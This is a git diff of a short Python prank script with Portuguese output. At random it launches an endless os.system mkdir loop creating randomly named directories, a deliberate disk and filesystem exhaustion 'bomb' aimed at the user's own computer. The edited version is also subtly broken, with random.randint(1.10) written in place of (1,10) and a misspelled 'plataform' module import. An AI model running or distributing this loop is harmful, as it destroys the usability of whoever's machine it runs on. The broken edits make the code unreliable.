@@ -1,7 +1,8 @@
 import os
 import random
 
-deathorlive = random.randint(1,10)
+escolha = random.randint(1,10)
+morte = random.randint(1.10)
 
 def bomb(Length):
     number = '0123456789'
@@ -14,20 +15,11 @@ def bomb(Length):
         id += random.choice(ra)
     return id
 
-def detectsystem():
-    global system
-    try:
-        os.system("clear")
-        system = "linux"
-    except:
-        os.system("cls")
-        system = "windows"
+system = __import__("plataform").system()
 
-detectsystem()
+if system == "Linux":
 
-if system == "linux":
-
-    if deathorlive == 5:
+    if escolha == morte:
         print("Boa noite!")
         while True: 
             os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
@@ -39,7 +31,7 @@ if system == "linux":
         print("parabens, seu pc está vivo :DDD !!!")
 
 else:
-    if deathorlive == 5:
+    if escolha == morte:
         print("Boa noite!")
         while True: 
             os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
